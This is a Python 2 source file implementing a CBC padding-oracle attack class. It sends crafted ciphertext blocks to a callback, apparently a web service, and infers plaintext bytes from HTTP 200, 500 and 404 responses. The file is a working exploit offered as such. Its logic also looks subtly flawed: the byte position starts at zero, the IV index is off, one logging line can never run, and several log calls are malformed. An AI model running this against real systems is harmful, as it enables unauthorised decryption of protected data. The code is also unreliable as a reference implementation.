import logging

def xord(string_one, string_two):
    output = ""
    for i, j in zip(string_one, string_two):
        output += chr( ord(i) ^ ord(j) )
    return output

class PaddingAttack(object):
    """
    Perform a padding attack using a single block of crafted
    ciphertext
    """
    def __init__(self, enc_block, IV, callback, blocklen=16):
        self.enc_block = enc_block.decode("hex")
        self.IV = IV.decode("hex")
        self.callback = callback
        self.blocklen = blocklen

    def attack(self):
        intermediate_bytes = []
        decrypted_bytes = []
        pos = 0
        blocksize = 16
        while pos <= 16:
            data = "\x00" * (blocksize-pos) + chr(pos) * pos
            for i in range(1, 0xff+1):
                temp = map(chr, intermediate_bytes)
                data = data[:blocksize-pos] + chr(i) + xord(temp, [chr(pos)]*len(intermediate_bytes))
                data += self.enc_block
                return_code = self.callback(data.encode("hex"))
                if return_code == 200:
                    logging.log(logging.DEBUG, "[200] Valid decrpyption obtained.")
                elif return_code == 500:
                    continue
                    logging.log(logging.DEBUG, "[500], invalid padding.")
                elif return_code == 404:
                    logging.log(logging.DEBUG, "[404], valid padding, invalid decryption.")
                    byte = pos ^ i
                    intermediate_bytes.insert(0, byte)
                    decrypted_bytes.insert(0, byte^ord(self.IV[-pos]))
                    logging.log(logging.DEBUG, "Intermediate bytes found to be", intermediate_bytes)
                    logging.log(logging.DEBUG, "Decrypted bytes so far", decrypted_bytes)
                    break
            pos += 1

        decrypted_bytes = ''.join(map(chr, decrypted_bytes))
        logging.log(logging.DEBUG, "Fully Decrypted data - ", decrypted_bytes)
        return decrypted_bytes
